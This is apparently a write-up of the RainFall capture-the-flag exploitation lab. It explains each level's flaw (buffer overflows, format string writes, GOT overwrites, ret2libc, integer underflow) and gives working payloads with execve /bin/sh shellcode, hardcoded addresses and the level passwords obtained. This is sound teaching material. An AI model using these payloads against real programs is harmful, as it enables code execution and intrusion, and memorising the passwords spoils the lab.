# Table of contents

- [level0](#level0)
  * [Type of exploit](#type-of-exploit)
  * [Details of level0](#details-of-level0)
- [level1](#level1)
  * [Type of exploit](#type-of-exploit-1)
  * [Details of level1](#details-of-level1)
- [level2](#level2)
  * [Type of exploit](#type-of-exploit-2)
  * [Details of level2](#details-of-level2)
- [level3](#level3)
  * [Type of exploit](#type-of-exploit-3)
  * [Details of level3](#details-of-level3)
- [level4](#level4)
  * [Type of exploit](#type-of-exploit-4)
  * [Details of level4](#details-of-level4)
- [level5](#level5)
  * [Type of exploit](#type-of-exploit-5)
  * [Details of level5](#details-of-level5)
- [level6](#level6)
  * [Type of exploit](#type-of-exploit-6)
  * [Details of level6](#details-of-level6)
- [level7](#level7)
  * [Type of exploit](#type-of-exploit-7)
  * [Details of level7](#details-of-level7)
- [level8](#level8)
  * [Type of exploit](#type-of-exploit-8)
  * [Details of level8](#details-of-level8)
- [level9](#level9)
  * [Type of exploit](#type-of-exploit-9)
  * [Details of level9](#details-of-level9)
- [bonus0](#bonus0)
  * [Type of exploit](#type-of-exploit-10)
  * [Details of bonus0](#details-of-bonus0)
- [bonus1](#bonus1)
  * [Type of exploit](#type-of-exploit-11)
  * [Details of bonus1](#details-of-bonus1)
- [bonus2](#bonus2)
  * [Type of exploit](#type-of-exploit-12)
  * [Details of bonus2](#details-of-bonus2)
- [bonus3](#bonus3)
  * [Type of exploit](#type-of-exploit-13)
  * [Details of bonus3](#details-of-bonus3)

# level0
## Type of exploit

Reverse engineering

## Details of level0

There is a call to `atoi()` that awaits a specific value and regular execution of code calls `execv("/bin/sh")`.

After analysis, the binary except `423` as argument to get our shell.

```shell-session
level0@RainFall:~$ ./level0 423
$ cat /home/user/level1/.pass
1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
```

# level1
## Type of exploit

Buffer-Overflow of vulnerable function `gets()` + predictability of addresses in the VM.

Overwriting return address with address of uncalled function `run()`.

## Details of level1

`main()` function uses (vulnerable) `gets()` to read stdin. Crashes after 80 characters.

There is an uncalled function in binary (`run()`), that calls a shell.

Its address is found with `info functions` in gdb, address is constant thanks to VM settings (NO ASLR).

We can feed an input to overwrite the return address with the address of `run()` function.

```shell-session
$ echo -n -e '0000000000000000000000000000000000000000000000000000000000000000000000000000\x44\x84\x04\x08' > injectme
$ cat /tmp/injectme | ./level1
Good... Wait what?
Segmentation fault (core dumped)
$ cat /tmp/injectme - | ./level1

Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

^C
Segmentation fault (core dumped)
```

# level2
## Type of exploit

Heap-based Shellcode Injection + Buffer-Overflow + Runtime Instruction Pointer Overwriting

Use of vulnerable function `gets()`, allocation on the heap of malicious shellcode.

## Details of level2

Program allocates a string on the heap with `strdup()` by reading stdin with `gets()`.

We can predict where the heap starts after the call to `strdup()` thanks to the `info proc mappings` tool of gdb.

We just need to get offset of buffer with pattern generator. (offset of 80 bytes)

Choose working shellcode from Database (28 bytes long), subtract from buffer offset the length of the shellcode to get the length of the padding (80 - 28 = 52)

Send [`shellcode + padding + (starting address of the heap)+8`] to `strdup()` to jump to the shellcode at runtime.

```shell-session
level2@RainFall:~$
(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'thisisjustbutapaddingtoguaranteethatwehaveanoverflow' + '\x08\xa0\x04\x08'"; cat -) | ./level2
1Ph//shh/bin�°
              ̀1@̀thisisjustbutapaddingtoguaranteethveanoverflow
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

# level3
## Type of exploit

Format String Attack: no variadic argument to printf + no sanitization of user-defined conversion string fed to `printf()` allows to print and edit values in memory.

Lack of ASLR makes it easy to find address of a given symbol, namely `m()`.

## Details of level3

Binary naturally opens a shell but an `if` statement prevent us from going there.

There is a comparison between a global symbol (`m()`) and a hardcoded value (`64`). `m()` is outside the control flow, so no register injection here.

Program takes input and gives it to `printf()`, with no other argument.

We can use printf features to edit a given address with an arbitrary value:
- option `$` that is used with an integer i to access the ith argument positionned after `printf()` (`%4$s` will apply `%s` to argument 4)
- type conversion `%n` that inserts an integer corresponding to the number of bytes written so far in the type conversion format. (`123%2$n` will insert 3 in 2nd argument to `printf()`)

Since we have the address of function `m()`, and we know the position of the format string as argument to `printf()`, we can compose a conversion string to insert an arbitrary value at that specific location:

[`address of m (4 bytes) + %60c (60 bytes) + %4$n`]-> addres of m is now equal to 64
```shell-session
level3@RainFall:~$ (python -c "print '\x8c\x98\x04\x08' + '%60c' + '%4\$n'"; cat -) | ./level3

Wait what?!
cat /home/user/$(whoami)/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

# level4

## Type of exploit

Same as level3, except `m` is not a function but a global variable:

Format String Attack: no variadic argument to printf + no sanitization of user-defined conversion string fed to `printf()` allows to print and edit values in memory.

Lack of ASLR makes it easy to find address of a given symbol, namely `m`.

## Details of level4

Same as level3, except the value to insert at the global variable symbol `m` is not `64`(10) but `16930116`(10).

Steps:
1. gets address of `m` (`0x08049810`)
2. find position of conversion string in arguments to printfs (12th)
3. use `%12$n` and build format string

```shell-session
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112c" + "%12$n"' | ./level4
```

# level5

## Type of exploit

Format String Attack + GOT overwrite

## Details of level5

There is an uncalled function `o()` in the binary that calls a shell.

`main()` calls `p()` which calls `fgets(stdin)` then `printf(user_input)` and then `exit@plt`.

We can use a format string attack to overwrite the address pointed by the pointer the GOT provided with the address of `o()`.

1. get address of `o()` (`0x080484a4`(16) == `134513828`(10))
2. get address of pointer provided by GOT
3. get position of format string in the stack (4)
4. use `%4$n` and build format string.

```shell-session
level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%134513824c" + "%4$n"'; cat) | ./level5
[...Huge long string of bytes that prints for tens of seconds...]
_
whoami
level6
cat ~level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

# level6

## Type of exploit

Buffer Overflow + behaviour of `malloc()` and contiguity of allocated memory chunks + use of `strcpy`

## Details of level6

`info functions` tells us there are three functions: `n()(0x08048454)`, `m()`, `main()`.

In the main there are two successive calls to `malloc()` into two different variables, and a mention of the address of `m()` as well, which address is placed in and called from a register.

`disas n` tells us that there is a call to `system(/bin/cat /home/user/level7/.pass)` inside it, but `n()` is never called.

Since we know the program uses `malloc()` successively and calls `strcpy()` with `argv[1]` and one of the `malloc-ed pointer`, we can use a `strcpy()` vulnerability to overwrite the address of the allocated pointer that is stored in the register, and make it point to `n()`.

```shell-session
level6@RainFall:~$ ./level6 $(python -c 'print "B"*72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

# level7

## Type of exploit

Buffer Overflow + behaviour of `malloc()` and contiguity of allocated memory chunks + use of `strcpy()` + GOT overwrite

## Details of level7

There are two custom functions in the binary `m()` and `main()`.

`main()` reads the contents of `/home/user/level8/.pass` and puts it a global variable `c` that is only printed in function `m()`.

`m()` is never called, but there is an invocation of `puts@plt` which GOT-provided address we can overwrite.

We see with `ltrace` that `argv[1]` and `argv[2]` are given to calls to `strcpy()` along with two locally `malloc-ed` pointers.

```shell-session
level7@RainFall:~$ ltrace ./level7 ayooooo ayoooooooooooo
__libc_start_main(0x8048521, 3, 0xbffffce4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                 = 0x0804a008
malloc(8)                                                 = 0x0804a018
malloc(8)                                                 = 0x0804a028
malloc(8)                                                 = 0x0804a038
strcpy(0x0804a018, "ayooooo")                             = 0x0804a018
strcpy(0x0804a038, "ayoooooooooooo")                      = 0x0804a038
```

We see there is an offset of `20` between both `malloc-ed` address given to `strcpy()` calls. This makes it possible to overwrite the second pointer with the address of uncalled function `m()`.

- address of `m()` : 0x080484f4
- offset of buffer is 20
- pointer address of GOT: 0x8049928
Therefor, we can exploit both: `strcpy()` vulnerability and `malloc()` behaviour in order to overwrite the second pointer with the GOT pointer address with the addres of `m`.

Previous codeblock becomes:

```shell-session
strcpy(0x0804a018, "01234567890123456789\x28\x99\x04\x08")   = 0x0804a018
strcpy(0x08049928, "\xf4\x84\x04\x08")                       = 0x08049928
```

# level8

## Type of exploit

Reverse engineering + `malloc()` allocation behaviour exploitation

## Details of level8

Program is an infinite loop that awaits a series of input strings in order to do different tasks.

`auth ` allocates a pointer with `malloc()`
`service` does too
`reset` frees the pointer allocated by `auth `
`login` may prompt a shell if (`auth `_pointer + 8 != 0)

if you call:

- `auth ` then `servic` twice

or

- `auth ` then `service 0123456789abcdef`, the offset of `auth+8` is not equal to 0, and a shell appears.

# level9
## Type of exploit

Shellcode injection + exploit vulnerable function `memcpy()`

## Details of level9

C++ binary.

We need to dig inside the assembler to understand what's going on.

The most notable information are:
1. `memcpy()` is used inside a method
2. It returns in `eax` a function address that is then used for a call (`*f()`)
3. the buffer offset is `104`
4. `eax` address is `0x804a00c`
5. address of shellcode is `0x804a00c` + `0x4` == `0x804a010`
6. Payload must have a length: `104` (buffer size) + `4` (buffer address) + `4` (overwritten address) = `112` of payload length

```shell-session
./level9 $(python -c "print '\x10\xa0\x04\x08' + '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'B' * 80 + '\x0c\xa0\x04\x08'")
#                           |address-in-eax+4| + |------------------------------------------------------------------------------------------------| + |padding|+ |-address-in-eax-|
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

# bonus0
## Type of exploit

Use of vulnerable functions `strcat`, `strcpy `and `strncpy` to Buffer overflow + env variable shellcode execution 

## Details of bonus0

Functions are : `main` calls `pp` calls `p`.

The `main` function declares a `buffer[54]` and calls a custom function `pp(buffer)` then prints the contents of the buffer.

`pp` calls faulty functions `strcpy` and `strcat` after calling `p`  with `buffer1[20]` and `buffer2[20]`. They are faulty because they look for `\0` to stop writing which will be absent in both buffers after careful tailoring of input.

`p` reads from `stdin` and writes it in a local buffer.
Also, there is a call to `strncpy(bufferN, localbuffer, 20)` which makes it possible for us to make both `buffer1` and `2` to be `non null-terminated` if we write more than `20` char through `stdin`.

- `buffer[54]`
- `buffer1[20]`
- `buffer2[20]`

Subsequent calls to `strcpy` and `strcat` do the following:
1. `strcpy(buffer, buffer1)`: writes both `buffer1` and `2` into `buffer` because `buffer1` is not `null-terminated`
2. `strcat(buffer, buffer2)`: overwrites EIP of function `pp` with the address of a env variable containing a malicious shellcode

```shell-session
export SHELLCODE_ENV=`python -c 'print("\x90" * 4242 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
```

```shell-session
(python -c "print '\x90' * 4095 + '\n' + '\x90' * 9 + '\x79\xee\xff\xbf' + '\x90' * 100"; cat -) | ./bonus0
 -
 -
y� y�
whoami
<+ '\x90' * 9 + '\x79\xee\xff\xbf' + '\x90' * 100"; cat -) | ./bonus0
 -
 -
y�� y��
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

# bonus1

## Type of exploit

Integer underflow + buffer overflow

## Details of bonus1

There are two arguments passed to program:

`argv[1]` is fed to `atoi` and the returned value (`int i`) of that function call is used to write in a buffer of size `40` as follow: `memcpy(buffer, argv[2], (size_t)i)`, this is where the bufferoverflow will happen.

But before we reach that instruction:
1. `i` value is tested to be `<= 9`.
2. then `i` is multiplicated by `4`.
3. then `i` is fed to `memcpy(buffer, argv[2], (size_t)i)`.
4. then `i` is tested to be `== 1464814662` or (0x574F4C46)
5. a shell is opened

In order to make all these checks return true, we must do some arithmetic to find the correct value to pass the first checks, and then the correct padding to make the last test return true too:

```shell-session
bonus1@RainFall:~$ ./bonus1 -1073741809 $(python -c "print '\x90' * 40 + '\x46\x4c\x4f\x57'")
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

# bonus2
## Type of exploit

ret2libc + Buffer Overflow with vulnerable function `strcat`

## Details of bonus2

Program looks at an env variable `LANG` to decide which string to output:

- `LANG=default` -> `Hello `
- `LANG=fi`      -> `Hyvää päivää `
- `LANG=nl`      -> `Goedemiddag! `

`nl` and `fi` have bigger greeting messages and are therefor usefull to overflow the buffer used internally.

We see two calls to `strncpy`, one with `40` and the second with `32` as copy-length parameter.

Using pattern generators, we notice that if the first argument is 40 and second is `> 14` (offset is 18), the EIP is overwritten, so after gathering the address of `system()` (0xb7e6b060) and `/bin/sh` (0xb7f8cc58). we can construct a payload to return to call a shell:

```shell-session
bonus2@RainFall:~$ LANG=fi ./bonus2 $(python -c "print '\x90' * 40") $(python -c "print '\x90' * 18 + '\x60\xb0\xe6\xb7'+'BYTE'+'\x58\xcc\xf8\xb7'")
Hyvää päivää `�YTEX�
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

# bonus3


## Type of exploit

Reverse engineering

## Details of bonus3

Here we can clearly see there is a comparison between a `buffer` and `argv[1]` with `strcmp()`.

Furthermore, we have control over what is both in the `buffer` and `argv[1]` because of the call to `atoi()` that sets a value at an index we give it.

Knowing that, if we input an empty string as `argv[1]`, `buffer[0]` will be equal to `0` and so will be `argv[1]`.

When we do that, we get a shell..

```shell-session
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

